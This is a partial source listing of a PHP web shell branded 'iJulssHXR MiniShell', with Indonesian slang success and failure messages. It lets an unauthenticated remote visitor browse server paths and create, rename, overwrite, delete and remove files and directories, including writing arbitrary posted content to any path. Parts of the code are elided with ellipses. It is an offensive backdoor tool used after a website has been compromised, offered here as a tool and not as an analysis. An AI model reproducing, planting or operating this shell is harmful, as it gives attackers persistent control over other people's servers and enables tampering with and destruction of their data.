...
<html>
<head>
<title>iJulssHXR MiniShell >//<</title>
</head>';

?>

<center><img src="https://c.top4top.io/p_19185txpe0.png" height="500px">
<style> 
@font-face {
...
echo '</head>
<body><b>
<H1><center><font color="white">iJulss Gans >//<</font></center></h1>
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>$ posisi lo : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<font color="green">YeayyBisa Sob!</font><br />';
}else{
echo '<font color="red">Yah Gagal Sob!</font><br />';
}
}
...
echo '<font color="green">Yeayy, Rename Bisa Sob! </font><br />';
}else{
echo '<font color="red">Rename Gagal Sob! </font><br />';
}
...
echo '<font color="green">Yeayy, Bisa Sob! [ '.$new.' ]</font><br />';
}else{
echo '<font color="red">Yah Gagal sob:(</font><br />';
}
fclose($fp);
...
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Yeayy, Bisa Diedit Sob! </font><br />';
}else{
echo '<font color="red">Yahh, Gagal. kurang amal ente sob </font><br />';
}
fclose($fp);
}
$hell = $_GET['path'];
...
if(rmdir($patc)){
echo '<font color="green">TerEntod</font><br />';
}else{
echo '<font color="red#">Gagal TerEntod</font><br />';
}
}
//buat folder
if($_GET['type'] == 'buat'){
...
if(!mkdir($new)){
echo '<font color="red">Yah Gagal lo sob</font><br />';
}else{
echo '<font color="green">Yeayy, Bisa sob!</font><br />';
}
}
//Delete file
...
echo '<br><center>&copy; iJulsssHaxor 2021</b></body>
</html>';
function perms($file){
